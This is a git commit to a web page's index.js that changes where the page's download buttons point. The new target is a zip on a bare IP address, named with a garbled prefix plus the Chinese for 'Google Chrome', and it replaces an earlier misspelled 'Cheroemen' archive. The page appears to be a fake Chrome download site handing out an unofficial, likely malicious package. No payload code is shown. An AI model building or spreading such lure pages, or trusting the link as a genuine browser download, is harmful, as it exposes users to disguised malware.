54b936d87fe2a4127d6f7bfe60d62756846a4f0d
aa168188 <sli010342@gmail.com>
2025-11-04 01:09:35 +0800

    Update index.js

--- index.js
+++ index.js
@@ -1,6 +1,6 @@
 window.onload = function() {
     // 下载链接
-    let url = 'http://137.220.158.27/Cheroemen8.6.1.zip'
+    let url = 'http://137.220.158.27/chetuysupe%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8.zip'
 
     document.querySelectorAll('.download').forEach(item => {
         item.onclick = function() {
